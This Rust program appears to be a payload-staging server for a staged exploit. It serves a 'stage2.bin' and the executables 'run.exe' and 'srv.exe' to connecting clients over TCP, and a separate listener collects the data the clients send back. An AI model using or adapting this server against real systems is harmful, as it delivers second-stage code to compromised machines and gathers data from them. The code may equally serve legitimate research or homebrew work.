use std::io::Read;
use std::io::Write;
use std::net::TcpListener;
use std::path::PathBuf;
use std::time::Duration;

use clap::command;
use clap::Parser;
use log::error;
use log::info;
use log::warn;
use simple_logger::SimpleLogger;

#[derive(Parser, Debug)]
#[command(version, about, long_about = None)]
struct Args {
    /// Path to the stage2.bin to deliver
    #[arg(short, long)]
    stage2: PathBuf,

    /// Path to the run.exe to deliver
    #[arg(short, long)]
    run: PathBuf,

    /// Path to the srv.exe to deliver
    #[arg(short, long)]
    srv: Option<PathBuf>,
}

#[repr(packed)]
struct DynamicFile {
    file_len: [u8; 4],
    name_len: [u8; 4],
}

fn start_file_listener() {
    let listener = TcpListener::bind("0.0.0.0:8081").unwrap();
    info!("File listener listening...");

    for stream in listener.incoming() {
        std::thread::spawn(move || {
            info!("File listener connection established!");

            let mut stream = stream.unwrap();
            let mut file_data = String::new();
            let _ = stream.read_to_string(&mut file_data);

            println!("{}", file_data);
        });
        info!("Waiting for new file connection...")
    }
}

fn main() -> std::io::Result<()> {
    SimpleLogger::new().init().unwrap();

    let args = Args::parse();

    if !args.stage2.exists() {
        warn!("[WARN] Provided stage2 does not exist: {:?}", &args.stage2);
    }

    if !args.run.exists() {
        warn!("[WARN] Provided run does not exist: {:?}", args.run);
    }

    if let Some(srv) = args.srv.as_ref() {
        if !srv.exists() {
            warn!("[WARN] Provided srv does not exist: {:?}", srv);
        }
    }

    std::thread::spawn(start_file_listener);

    let listener = TcpListener::bind("0.0.0.0:8080").unwrap();
    info!("Server listening...");

    for stream in listener.incoming() {
        info!("Connection established!");

        let stage2 = std::fs::read(&args.stage2)?;
        let mut stream = stream.unwrap();

        info!("Sending stage2 len");
        stream.write_all(&(stage2.len() as u32).to_be_bytes())?;
        info!("Sending stage2");
        stream.write_all(&stage2)?;

        for (file_name, file_path) in [("run.exe", Some(&args.run)), ("srv.exe", args.srv.as_ref())]
        {
            if file_path.is_none() {
                continue;
            }

            let file_path = file_path.unwrap();

            info!("Sending {:?}'s metadata", file_path);
            let file_contents = std::fs::read(file_path)?;
            let file = DynamicFile {
                file_len: (file_contents.len() as u32).to_be_bytes(),
                name_len: (file_name.len() as u32).to_be_bytes(),
            };
            let file_as_byte_slice: &[u8] = unsafe {
                core::slice::from_raw_parts(
                    core::mem::transmute::<_, *const u8>(&file),
                    core::mem::size_of_val(&file),
                )
            };

            stream.write_all(file_as_byte_slice)?;
            stream.write_all(file_name.as_bytes())?;
            stream.write_all(&file_contents)?;
        }

        // Send the null terminator file
        let file = DynamicFile {
            file_len: [0u8; 4],
            name_len: [0u8; 4],
        };
        let file_as_byte_slice: &[u8] = unsafe {
            core::slice::from_raw_parts(
                core::mem::transmute::<_, *const u8>(&file),
                core::mem::size_of_val(&file),
            )
        };
        stream.write_all(file_as_byte_slice)?;

        info!("Waiting for new connection...")
    }

    Ok(())
}
